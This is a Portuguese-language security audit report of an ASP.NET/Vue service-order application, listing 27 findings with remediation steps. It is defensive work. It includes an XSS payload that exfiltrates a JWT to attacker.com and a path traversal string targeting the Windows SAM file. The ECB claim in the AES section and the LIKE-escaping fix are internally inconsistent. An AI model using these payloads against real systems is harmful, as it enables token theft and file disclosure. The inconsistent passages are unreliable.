# Review de Segurança — Eletromecanica

**Branch:** develop  
**Data:** 2026-04-22  
**Escopo:** SQL/command injection, XSS, CSRF, autenticação e autorização, secrets expostos, criptografia insegura, validação de input, exposição de dados sensíveis em logs/erros, dependências com CVEs.

> **Nota:** valores reais de senhas, tokens e chaves encontrados no repositório foram substituídos por `[REDACTED]` neste documento. As localizações exatas são suficientes para identificar e rotacionar cada credencial.

---

## Legenda de Severidade

| Severidade | Critério |
|---|---|
| **crítico** | Exploração imediata possível sem autenticação, ou credencial ativa exposta em repositório |
| **alto** | Exploração possível com contexto mínimo; impacto direto em confidencialidade ou integridade |
| **médio** | Exploração com precondições adicionais ou impacto limitado; degrada a postura de segurança |
| **baixo** | Defense-in-depth ausente; não explorado diretamente, mas aumenta superfície de ataque |

---

## Sumário Executivo

Foram identificados **27 achados** distribuídos em 5 críticos, 8 altos, 10 médios e 4 baixos. Os riscos mais graves são:

- **Credenciais ativas em texto plano no repositório** — senha do SA do SQL Server, chave AES de criptografia e credencial de conta de serviço estão comitadas nos arquivos `.env` e `appsettings.json`.
- **Exposição universal de detalhes de exceção** — todos os controllers devolvem `ex.Message` ao cliente em respostas 400, revelando estrutura interna.
- **Ausência de `[Authorize]` em endpoints críticos** — qualquer requisição autenticada (ou anônima) pode criar, alterar e excluir ordens de serviço, documentos e equipamentos.
- **Senha enviada como query parameter** — `alterarSenha` passa a senha na URL, gravando-a em logs de servidor e histórico de browser.
- **XSS via `v-html`** — dados de observações de OS são renderizados como HTML bruto sem sanitização.

---

## Achados

---

### [CRÍTICO-01] Senha do SA do SQL Server em texto plano no repositório

**Arquivo:** `API/appsettings.json:15`

```json
"DefaultConnection": "user id=sa;data source=localhost,1433;TrustServerCertificate=True;initial catalog=eletromecanica;password=[REDACTED]"
```

Adicionalmente, a linha 14 (comentada) contém uma string de conexão para o IP `20.75.52.218` (servidor de nuvem) com usuário e senha distintos — igualmente comitada.

**Impacto:** qualquer pessoa com acesso ao repositório (colaborador atual, ex-colaborador, leak de repositório) obtém credenciais de administrador do banco de dados. A conta `sa` tem controle total sobre a instância SQL Server.

**Ação imediata:**
1. Rotacionar a senha do `sa` e da conta `eletromecanica` agora.
2. Mover para variável de ambiente ou Azure Key Vault — nunca commitar string de conexão.
3. O arquivo `appsettings.json` não deve conter nenhum valor de credencial; usar `appsettings.json` apenas como template com placeholders.

---

### [CRÍTICO-02] Chave AES e credencial de conta de serviço nos arquivos `.env` comitados

**Arquivo:** `Presentation/Eletromecanica/.env.production:3–5`
**Arquivo:** `Presentation/Eletromecanica/.env.development:3–5`

```
VUE_APP_CHAVE_SEGURANCA=[REDACTED-UUID]
VUE_APP_USUARIO=sanegeo
VUE_APP_PASSWORD=[REDACTED-BASE64]
```

A mesma chave `VUE_APP_CHAVE_SEGURANCA` é usada para criptografar os dados do usuário logado armazenados no `localStorage`. Como é uma chave estática e compartilhada entre todos os clientes, qualquer pessoa que a possua pode decriptar os dados de sessão de qualquer usuário. A senha está em Base64 (não é criptografia — é ofuscação trivial).

**Impacto:** comprometimento total da camada de "criptografia" do frontend; credencial de conta de serviço permite obter tokens JWT para qualquer request.

**Ação imediata:**
1. Rotacionar a chave e a senha imediatamente.
2. Adicionar `.env.production` e `.env.development` ao `.gitignore`; criar `.env.example` com placeholders.
3. Nunca commitar arquivos `.env` com valores reais.

---

### [CRÍTICO-03] JWT de teste hardcoded em `main.js` executando em produção

**Arquivo:** `Presentation/Eletromecanica/src/main.js:59–470`

```js
// Temporário
let data = {
  data: {
    token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.[REDACTED]",
    usuario: {
      usuarioId: "62f4295c-7763-42cf-b33a-5ca851f0b1aa",
      email: "teste3@email.com",
      // ... permissões, módulos, etc.
    }
  }
}
// ...
localStorage.setItem('loginNovoSanegeo', CryptoJS.AES.encrypt(JSON.stringify(data), chaveSeguranca))
```

O comentário `//Temporário` (linha 59) indica que esse bloco deveria ter sido removido. Ele executa em todo carregamento do app, sobrescrevendo o `localStorage` com um usuário de teste com permissões definidas. O token JWT ainda está com expiração futura.

**Impacto:** qualquer usuário final que inspecione o `localStorage` após carregar a aplicação encontra dados de um usuário de teste com conjunto de permissões conhecido; o UUID `62f4295c...` pode ser usado para ações na API se os endpoints não validarem autorização adequadamente.

**Ação imediata:**
1. Remover o bloco inteiro (linhas 59–470 de `main.js`) imediatamente.
2. Invalidar o token JWT exposto rotacionando a chave de assinatura JWT no backend.

---

### [CRÍTICO-04] Google Maps API Key ativa exposta em múltiplos arquivos

**Arquivo:** `API/appsettings.json:22`
**Arquivo:** `Presentation/Eletromecanica/.env.production:6`
**Arquivo:** `Presentation/Eletromecanica/.env.development:6`

```
"Key": "AIzaSy[REDACTED]"
VUE_APP_GOOGLE_KEY=AIzaSy[REDACTED]
```

A mesma chave aparece em três arquivos comitados. Chaves do Google Maps sem restrições de referrer/IP podem ser usadas por terceiros para cobranças na conta do titular.

**Ação imediata:**
1. Revogar a chave no Google Cloud Console e gerar uma nova.
2. Restringir a nova chave por HTTP referrer (domínio de produção) e por API (Maps JavaScript API, Geocoding API apenas).
3. Remover dos arquivos versionados.

---

### [CRÍTICO-05] Senha enviada como query parameter na URL

**Arquivo:** `Presentation/Eletromecanica/src/services/seguranca/usuario-service.js:64–76`

```js
async alterarSenha(usuarioId, senha, repetirSenha) {
  const route = `${this.endpoint}usuario/senha`
    + `?id=${encodeURIComponent(usuarioId)}`
    + `&senha=${encodeURIComponent(senha)}`         // ← senha na URL
    + `&repetirSenha=${encodeURIComponent(repetirSenha)}`
  return await this.fetchResponse("PATCH", this.headerPadrao, null, false, route, true)
}
```

Senhas em query parameters são gravadas em: logs de servidor web/proxy, histórico do browser, cabeçalho `Referer` em requisições subsequentes e ferramentas de monitoramento (APM, WAF). A senha fica persistida em texto plano em múltiplos sistemas.

**Correção:** mover `senha` e `repetirSenha` para o corpo da requisição (`PATCH` com JSON body).

---

### [ALTO-01] `ex.Message` retornado ao cliente em todos os controllers

**Arquivo:** `API/Controllers/OrdemServicoController.cs:24,43,58,73,88,103,118,137,156,175,194`
**Arquivo:** `API/Controllers/DocumentoController.cs:18,100,120,138`
**Arquivo:** `API/Controllers/EquipamentoController.cs:22,40,59,78,97,116,135,150,168,190,212`
**Arquivo:** `API/Controllers/EstacaoController.cs:25,46,65,84,103,122,137`

Padrão presente em todos os controllers:

```csharp
catch (Exception ex)
{
    LogError(ex, nameof(Post));
    return BadRequest(new ErrorMessage(Constantes.ERRO_EXEC_METODO + ex.Message));
}
```

`ex.Message` pode revelar: nomes de tabelas e colunas SQL, caminhos de arquivo no servidor, nomes de assemblies, e detalhes de lógica interna. Em erros de SQL Server, a mensagem frequentemente inclui o texto completo da query ou a constraint violada.

**Correção:** retornar apenas um código de erro genérico ou ID de correlação para o cliente; logar o `ex` completo server-side.

---

### [ALTO-02] Ausência de `[Authorize]` em endpoints críticos

**Arquivo:** `API/Controllers/OrdemServicoController.cs` — todos os métodos sem atributo `[Authorize]`
**Arquivo:** `API/Controllers/DocumentoController.cs` — todos os métodos sem atributo `[Authorize]`
**Arquivo:** `API/Controllers/EquipamentoController.cs` — todos os métodos sem atributo `[Authorize]`

Nenhum controller possui `[Authorize]` no nível de classe nem nos métodos. O `Program.cs` chama `app.UseAuthentication()` e `app.UseAuthorization()`, mas sem os atributos de proteção os endpoints estão abertos para qualquer request (autenticado ou não, dependendo da configuração do JWT middleware).

**Impacto:** um atacante sem credenciais pode potencialmente criar, editar, cancelar ordens de serviço e fazer upload de arquivos.

**Correção:** adicionar `[Authorize]` no nível de controller como padrão; usar `[AllowAnonymous]` apenas onde necessário e explicitamente justificado.

---

### [ALTO-03] Path traversal em download e visualização de documentos

**Arquivo:** `API/Controllers/DocumentoController.cs:28–35` (Download)
**Arquivo:** `API/Controllers/DocumentoController.cs:52–58` (View)

```csharp
var safeRelative = (doc.CaminhoRelativo ?? string.Empty)
    .Replace('/', Path.DirectorySeparatorChar)
    .Replace('\\', Path.DirectorySeparatorChar);

var fullPath = Path.Combine(storage.Value.RootPath, safeRelative, doc.NomeArmazenado);

if (!System.IO.File.Exists(fullPath))
    return NotFound();

return File(stream, mime, doc.NomeOriginal);
```

O `Replace` troca separadores mas não remove sequências `../`. `Path.Combine` no .NET descarta o base path se o segundo argumento for absoluto, mas não protege contra `../../` relativo. Se `CaminhoRelativo` vier de um registro de banco manipulado (ex: `../../Windows/System32/config/SAM`), o servidor tentará servir esse arquivo.

**Correção:** após `Path.Combine`, validar que `fullPath.StartsWith(storage.Value.RootPath)` com `Path.GetFullPath` antes de abrir o arquivo.

```csharp
var fullPath = Path.GetFullPath(Path.Combine(rootPath, safeRelative, doc.NomeArmazenado));
if (!fullPath.StartsWith(Path.GetFullPath(rootPath), StringComparison.OrdinalIgnoreCase))
    return Forbid();
```

---

### [ALTO-04] XSS via `v-html` sem sanitização

**Arquivo:** `Presentation/Eletromecanica/src/views/DetalharOrdemServico.vue:182`
**Arquivo:** `Presentation/Eletromecanica/src/views/NovaOrdemServico.vue:742`

```html
<!-- DetalharOrdemServico.vue:182 -->
<div class="ql-editor ql-editor-readonly" v-html="ocorrencia.observacao"></div>

<!-- NovaOrdemServico.vue:742 -->
<div class="ql-editor ql-editor-readonly" v-html="observacoes"></div>
```

`ocorrencia.observacao` vem do backend (campo livre editado via Quill Editor). Se um usuário malicioso inserir `<script>alert(document.cookie)</script>` ou `<img src=x onerror="fetch('https://attacker.com/?t='+localStorage.getItem('tokenSeguranca'))">` no campo de observações, o script executará no browser de qualquer usuário que visualizar a OS.

O token JWT está armazenado em `localStorage` (`tokenSeguranca`) sem flag `HttpOnly`, tornando-o acessível via JavaScript.

**Correção:** sanitizar o HTML antes de renderizar com DOMPurify:
```js
import DOMPurify from 'dompurify';
// no template:
v-html="DOMPurify.sanitize(ocorrencia.observacao)"
```

---

### [ALTO-05] Sem autorização de recurso em download de documentos

**Arquivo:** `API/Controllers/DocumentoController.cs:22–43`

```csharp
[HttpGet("{id}/download")]
public async Task<IActionResult> Download(Guid id, CancellationToken cancellationToken)
{
    var doc = await service.GetByIdAsync(id, cancellationToken: cancellationToken);
    if (doc is null || doc.Ativo == false) return NotFound();
    // Nenhuma verificação se o usuário logado tem acesso a este documento
    return File(stream, mime, doc.NomeOriginal);
}
```

Qualquer usuário autenticado pode baixar qualquer documento da base apenas conhecendo ou enumerando GUIDs. O mesmo padrão existe no endpoint `View` (linha 46).

**Correção:** verificar se o documento pertence a uma entidade (OS, equipamento) à qual o usuário tem acesso antes de servir o arquivo.

---

### [ALTO-06] Open redirect após login via `localStorage`

**Arquivo:** `Presentation/Eletromecanica/src/router/index.js:95`
**Arquivo:** `Presentation/Eletromecanica/src/views/Login.vue:213–214`

```js
// router/index.js:95 — grava rota de destino sem validação
localStorage.setItem('rotaNavegacao', to.fullPath);

// Login.vue:213-214 — redireciona para qualquer valor gravado
const rotaNavegacao = localStorage.getItem('rotaNavegacao')
if (rotaNavegacao) {
  localStorage.removeItem('rotaNavegacao');
  await router.push(rotaNavegacao)  // ← valor não validado
}
```

`to.fullPath` pode ser manipulado via XSS (que já existe, achado ALTO-04) para gravar uma URL externa. `router.push()` do Vue Router rejeita URLs externas, mas o vetor combinado com XSS permite sequestrar o redirecionamento pós-login.

**Correção:** validar que `rotaNavegacao` começa com `/` e não contém `://` antes de usar.

---

### [ALTO-07] Renovação de token usa credenciais de conta de serviço hardcoded

**Arquivo:** `Presentation/Eletromecanica/src/services/fetch-service.js:71–79` e `90–101`
**Arquivo:** `Presentation/Eletromecanica/src/main.js:34–37`

```js
// main.js:34–37
const usuarioSeguranca = {
  user: process.env.VUE_APP_USUARIO,     // "sanegeo"
  password: process.env.VUE_APP_PASSWORD  // [REDACTED]
}

// fetch-service.js:71–79
if (response.statusCode === 401 && data.data?.erroToken) {
  const resultadoToken = await this.obterToken()  // usa usuarioSeguranca
  if (resultadoToken.statusCode === 200) {
    localStorage.setItem('tokenSeguranca', resultadoToken?.data.token)
    return await this.fetchResponse(...)  // retry automático
  }
}
```

As credenciais de conta de serviço chegam ao bundle JavaScript compilado (qualquer ferramenta de build inclui valores de `process.env.VUE_APP_*` no bundle). Qualquer pessoa com acesso ao bundle de produção obtém a senha.

**Impacto:** a conta de serviço pode ser usada para obter tokens válidos indefinidamente, contornando autenticação de usuário real.

**Correção:** o mecanismo de refresh de token deve usar refresh tokens (OAuth 2.0 PKCE) e nunca expor credenciais de aplicação ao cliente.

---

### [ALTO-08] Criptografia AES sem IV — modo ECB implícito no CryptoJS

**Arquivo:** `Presentation/Eletromecanica/src/main.js:469`
**Arquivo:** `Presentation/Eletromecanica/src/views/Login.vue:211`
**Arquivo:** `Presentation/Eletromecanica/src/router/index.js:100`
**Arquivo:** `Presentation/Eletromecanica/src/services/fetch-service.js:29–30`

```js
// Criptografia (Login.vue:211)
const criptografado = CryptoJS.AES.encrypt(JSON.stringify(resultado.data), chaveSeguranca).toString()

// Descriptografia (router/index.js:100)
const bytes = CryptoJS.AES.decrypt(localStorage.getItem('loginNovoSanegeo'), inject('chaveSeguranca'))
```

Quando `CryptoJS.AES.encrypt` recebe uma string como chave (não um `WordArray`), ele usa PBKDF1 com salt aleatório para derivar chave e IV — o que é moderadamente seguro. Entretanto:

1. A **chave raiz é estática e global** — a mesma UUID para todos os clientes e ambientes.
2. **Sem HMAC/autenticação do ciphertext** — um atacante que modifique o `localStorage` pode fazer a aplicação processar dados manipulados sem detecção.
3. CryptoJS é uma biblioteca legada; para dados sensíveis em browser, preferir `SubtleCrypto` (Web Crypto API nativa).

---

### [MÉDIO-01] SQL LIKE com parâmetros de busca livre — risco de LIKE injection

**Arquivo:** `Data/Repositories/OrdemServicoRepository.cs:181–184`
**Arquivo:** `Data/Repositories/OrdemServicoRepository.cs:412–428`
**Arquivo:** `Data/Repositories/EquipamentoRepository.cs:143–182`
**Arquivo:** `Data/Repositories/DocumentoRepository.cs:187`

```csharp
// OrdemServicoRepository.cs:181–184
builder.Where(@"
    UPPER(OS.Codigo) LIKE '%' + @Todos + '%'
    OR CAST(OS.Numero AS VARCHAR(50)) LIKE '%' + @Todos + '%'",
    "@Todos", filter.Todos.Trim().ToUpper());
```

As queries usam parâmetros Dapper corretamente (sem concatenação direta), porém o padrão `'%' + @param + '%'` ainda permite **LIKE injection**: o caractere `%` e `_` dentro do valor do parâmetro são interpretados como wildcards pelo SQL Server, podendo causar varredura completa de tabela e, em casos extremos, extração de dados por pattern matching. O caractere `[` permite ranges (`[a-z]`).

**Correção:** escapar os wildcards antes de passar ao parâmetro:
```csharp
var valor = filter.Todos.Trim().ToUpper()
    .Replace("[", "[[]").Replace("%", "[%]").Replace("_", "[_]");
builder.Where("... LIKE '%' + @Todos + '%' ESCAPE '!'", "@Todos", valor);
```

---

### [MÉDIO-02] CORS com `AllowCredentials` + `AllowAnyHeader` + `AllowAnyMethod`

**Arquivo:** `API/Program.cs:14–17`

```csharp
policy.WithOrigins(origins)
      .AllowAnyHeader()
      .AllowAnyMethod()
      .AllowCredentials();
```

**Arquivo:** `API/appsettings.json:10`

```json
"Origins": [ "", "" ]
```

Dois problemas distintos:

1. `AllowAnyHeader` + `AllowAnyMethod` + `AllowCredentials` é a configuração CORS mais permissiva possível.
2. As origens são strings vazias `""` — comportamento indefinido: pode ser interpretado como "sem origens permitidas" (sem efeito prático) ou pode tratar uma string vazia como wildcard dependendo da versão do middleware.

**Correção:** restringir a lista de origens aos domínios de produção reais; substituir `AllowAnyMethod` pelos verbos HTTP efetivamente usados.

---

### [MÉDIO-03] Log injection via header `Usuario` controlado pelo cliente

**Arquivo:** `API/Controllers/BaseController.cs:7` e `21`

```csharp
var usuario = Request.Headers["Usuario"].ToString();
// ...
eventInfo.Properties.Add("usuario", usuario);
logger.Log(eventInfo);
```

O valor do header `Usuario` vem diretamente do cliente sem sanitização e é gravado nos logs (banco de dados). Um atacante pode injetar caracteres de controle, quebras de linha (`\n`, `\r`) ou markup XML/JSON para adulterar entradas de log, ocultar atividade maliciosa ou confundir sistemas de análise de log.

**Correção:** sanitizar o valor removendo caracteres de controle antes de logar; ou usar o claim do JWT após validação em vez de um header livre.

---

### [MÉDIO-04] Stack trace completa gravada no banco de dados de log

**Arquivo:** `API/nlog.config:22`

```xml
<parameter name="@exception" layout="${exception:tostring}" />
```

`${exception:tostring}` inclui o stack trace completo. Logs gravados em banco SQL Server criam um repositório de informações internas pesquisável por qualquer usuário com acesso à tabela `Log`. Se o banco for comprometido, o atacante obtém um mapa da arquitetura interna do sistema.

**Correção:** usar `${exception:format=Message}` para logs de nível Info/Warn; reservar `tostring` apenas para erros críticos em logs de arquivo, não de banco.

---

### [MÉDIO-05] Upload de arquivo sem validação de tipo, extensão ou tamanho

**Arquivo:** `Business/Services/DocumentoService.cs:25–26`
**Arquivo:** `Business/Dtos/AdicionarDocumentoRequest.cs:15`

```csharp
// DocumentoService.cs:25–26 — única validação existente
if (request.Arquivo is null || request.Arquivo.Length <= 0)
    throw new InvalidOperationException("Arquivo inválido.");
```

```csharp
// AdicionarDocumentoRequest.cs:15 — sem atributos de validação
public IFormFile Arquivo { get; set; } = default!;
```

Não há:
- Limite de tamanho (arquivo de 2 GB seria aceito)
- Whitelist de extensões (`.exe`, `.php`, `.aspx` seriam aceitos)
- Validação de magic bytes (MIME type do `Content-Type` é controlado pelo cliente)

**Impacto:** potencial para upload de webshells, arquivos maliciosos ou exaustão de disco/memória.

**Correção:**
```csharp
private static readonly HashSet<string> ExtensõesPermitidas = new() { ".pdf", ".jpg", ".png", ".docx", ".xlsx" };
private const long TamanhoMaximoBytes = 10 * 1024 * 1024; // 10 MB

if (request.Arquivo.Length > TamanhoMaximoBytes) throw new ...;
var ext = Path.GetExtension(request.Arquivo.FileName).ToLowerInvariant();
if (!ExtensõesPermitidas.Contains(ext)) throw new ...;
```

---

### [MÉDIO-06] Parâmetros de coordenadas geográficas recebidos como `string` sem validação

**Arquivo:** `API/Controllers/OrdemServicoController.cs:93–97`
**Arquivo:** `Business/Services/OrdemServicoService.cs:77–86`
**Arquivo:** `Data/Repositories/OrdemServicoRepository.cs:309`

```csharp
// Controller:93–97
public async Task<IActionResult> GetOrdemServicoNearByAsync(
    [FromQuery] string lat,
    [FromQuery] string lon,
    CancellationToken cancellationToken)
{
    var result = await service.GetOrdemServicoNearByAsync(lat, lon, cancellationToken);
```

```csharp
// Repository:309
new { Lat = lat, Long = lon, RaioKm = raioKm }
```

`lat` e `lon` são passados como `string` através de três camadas sem validação de formato decimal nem range de coordenadas válidas (-90..90 / -180..180). Dapper as passará ao SQL como parâmetros de string, podendo causar erros de conversão implícita ou comportamento inesperado na query geoespacial.

**Correção:** usar `[FromQuery] decimal lat` no controller; o model binding do ASP.NET Core já rejeita valores não numéricos automaticamente.

---

### [MÉDIO-07] Cabeçalhos de segurança HTTP ausentes no backend

**Arquivo:** `API/Program.cs:73–76`

O pipeline não configura nenhum cabeçalho de segurança:

| Cabeçalho ausente | Risco |
|---|---|
| `X-Content-Type-Options: nosniff` | MIME sniffing em downloads de documentos |
| `X-Frame-Options: DENY` | Clickjacking |
| `Strict-Transport-Security` | Downgrade para HTTP |
| `Content-Security-Policy` | XSS de segunda ordem |
| `Referrer-Policy: no-referrer` | Vazamento de URLs internas |

**Correção:** adicionar middleware de headers ou usar o pacote `NWebSec` / `SecurityHeaders`.

---

### [MÉDIO-08] Content Security Policy ausente no HTML do frontend

**Arquivo:** `Presentation/Eletromecanica/public/index.html`

Nenhuma meta tag `Content-Security-Policy` presente. Combinado com o uso de `v-html` (ALTO-04), qualquer XSS consegue executar scripts arbitrários sem restrição.

**Correção mínima:**
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
```

---

### [MÉDIO-09] Verificação de autorização feita exclusivamente no frontend

**Arquivo:** `Presentation/Eletromecanica/src/router/index.js:103–133`

```js
let rotasLiberadas = ['/painel-manobras']
login.data.usuario.modulos?.forEach(modulo => {
  modulo.telas?.forEach(tela => rotasLiberadas.push(tela.url))
})
// ...
const podeAcessar = matchesAllowed(to.path, rotasLiberadas) || to.path === '/acesso-negado';
next(podeAcessar ? undefined : '/acesso-negado');
```

O controle de acesso por rota é calculado a partir dos módulos/telas decodificados do `localStorage`. Um usuário pode abrir o DevTools, modificar o objeto descriptografado em memória e navegar para rotas que não deveria acessar. O backend (controllers) não possui `[Authorize(Roles = "...")]` ou policy-based authorization, então as requisições também chegam sem verificação de role server-side.

**Correção:** manter o guard de rota no frontend para UX, mas implementar policy-based authorization no backend como controle primário.

---

### [MÉDIO-10] `catch` vazio sem logging swallowing erros silenciosamente

**Arquivo:** `Business/Services/DocumentoService.cs:156–160`

```csharp
catch
{
    await transaction.RollbackAsync(cancellationToken);
    return false;
}
```

Erros de banco, erros de I/O e erros de negócio são silenciados. Nenhum rastro de auditoria é criado quando uma deleção de documento falha — impossível distinguir entre "arquivo não encontrado" e "erro de permissão no banco" ou "ataque de path traversal detectado pelo sistema de arquivos".

---

### [BAIXO-01] Token JWT armazenado em `localStorage` (acessível via XSS)

**Arquivo:** `Presentation/Eletromecanica/src/services/fetch-service.js:25` e `74`

```js
requestHeaders.Authorization = `Bearer ${localStorage.getItem('tokenSeguranca')}`
// ...
localStorage.setItem('tokenSeguranca', resultadoToken?.data.token)
```

`localStorage` não tem flag `HttpOnly` — qualquer JavaScript executado na página consegue ler o token. A boa prática atual é usar cookies `HttpOnly` + `Secure` + `SameSite=Strict` para tokens de sessão. Combinado com o XSS via `v-html` (ALTO-04), o token pode ser exfiltrado.

---

### [BAIXO-02] Ausência de proteção CSRF

Toda a aplicação usa `Bearer` token em header `Authorization` para autenticação. Isso **por si só** protege contra CSRF clássico (browsers não enviam headers customizados cross-origin por padrão). Entretanto:

**Arquivo:** `Presentation/Eletromecanica/src/main.js:52`

```js
app.provide('headerPadrao', { 'Content-Type': 'application/json' })
```

O header padrão não inclui nenhum token CSRF. Se em algum momento a autenticação for migrada para cookies, toda a aplicação ficará vulnerável a CSRF imediatamente porque não há nenhuma infraestrutura de token anti-CSRF no lugar.

---

### [BAIXO-03] `System.Data.SqlClient` legado e descontinuado em uso

**Arquivo:** `API/API.csproj`
**Arquivo:** `Worker/Worker.csproj`

```xml
<PackageReference Include="System.Data.SqlClient" Version="4.9.1" />
```

`System.Data.SqlClient` foi descontinuado pela Microsoft (último release em 2022). Não recebe patches de segurança. O driver moderno `Microsoft.Data.SqlClient` (já presente em `Data.csproj`) deve substituí-lo em todos os projetos. A versão 4.9.1 pode ter CVEs não corrigidos.

---

### [BAIXO-04] Caminho absoluto de desenvolvedor em `appsettings.json`

**Arquivo:** `API/appsettings.json:18`

```json
"RootPath": "C:\\Users\\danie.DESKTOP-M1EOC6E\\OneDrive\\Área de Trabalho\\..."
```

Expõe nome de usuário Windows, estrutura de diretórios e indica que o armazenamento de documentos está em uma pasta do OneDrive (sincronizada com a nuvem). Esse path não funciona em nenhum servidor de produção e revela informações do ambiente de desenvolvimento.

---

## Mapa de Prioridades

| # | Severidade | Achado | Arquivo Principal |
|---|---|---|---|
| 01 | **crítico** | Senha SA do SQL Server em `appsettings.json` | `API/appsettings.json:15` |
| 02 | **crítico** | Chave AES + credencial de serviço nos `.env` comitados | `.env.production:3–5` |
| 03 | **crítico** | JWT de teste hardcoded executando em produção | `src/main.js:59–470` |
| 04 | **crítico** | Google Maps API Key em três arquivos comitados | `appsettings.json:22` / `.env:6` |
| 05 | **crítico** | Senha enviada como query parameter na URL | `usuario-service.js:67–68` |
| 06 | **alto** | `ex.Message` retornado em todos os controllers | `OrdemServicoController.cs:24` (+30 ocorrências) |
| 07 | **alto** | Sem `[Authorize]` em endpoints críticos | Todos os controllers |
| 08 | **alto** | Path traversal em download de documentos | `DocumentoController.cs:28–35` |
| 09 | **alto** | XSS via `v-html` sem sanitização | `DetalharOrdemServico.vue:182` |
| 10 | **alto** | Sem autorização de recurso em download | `DocumentoController.cs:22–43` |
| 11 | **alto** | Open redirect pós-login via `localStorage` | `Login.vue:213–214` |
| 12 | **alto** | Renovação de token com credenciais hardcoded no bundle JS | `fetch-service.js:90–101` |
| 13 | **alto** | Criptografia AES sem autenticação (sem HMAC) | `Login.vue:211` / `router/index.js:100` |
| 14 | **médio** | LIKE injection em queries de busca | `OrdemServicoRepository.cs:181` |
| 15 | **médio** | CORS permissivo com `AllowCredentials` e origins vazias | `Program.cs:14–17` |
| 16 | **médio** | Log injection via header `Usuario` | `BaseController.cs:7` |
| 17 | **médio** | Stack trace completa gravada no banco de log | `nlog.config:22` |
| 18 | **médio** | Upload sem validação de tipo, extensão ou tamanho | `DocumentoService.cs:25–26` |
| 19 | **médio** | Coordenadas geográficas recebidas como `string` | `OrdemServicoController.cs:93` |
| 20 | **médio** | Cabeçalhos de segurança HTTP ausentes | `Program.cs:73–76` |
| 21 | **médio** | Content Security Policy ausente no HTML | `public/index.html` |
| 22 | **médio** | Autorização somente no frontend | `router/index.js:103–133` |
| 23 | **médio** | `catch` vazio silenciando erros | `DocumentoService.cs:156–160` |
| 24 | **baixo** | JWT em `localStorage` (acessível via JS) | `fetch-service.js:25` |
| 25 | **baixo** | Sem infraestrutura de token CSRF | `main.js:52` |
| 26 | **baixo** | `System.Data.SqlClient` legado sem patches | `API.csproj` / `Worker.csproj` |
| 27 | **baixo** | Caminho absoluto de desenvolvedor em config | `appsettings.json:18` |

---

## Ações Imediatas (antes do próximo deploy)

1. **Rotacionar** a senha do `sa`, a senha da conta `eletromecanica`, a chave AES (`VUE_APP_CHAVE_SEGURANCA`), a senha do `VUE_APP_PASSWORD` e a Google Maps API Key — todas estão comprometidas.
2. **Remover** o bloco de dados de teste de `main.js:59–470`.
3. **Adicionar** `.env.production`, `.env.development` e `appsettings.json` ao `.gitignore`; usar variáveis de ambiente ou secret manager no deploy.
4. **Invalidar** o token JWT exposto rotacionando a chave de assinatura JWT no backend.
5. **Adicionar** `[Authorize]` em todos os controllers como padrão de classe.
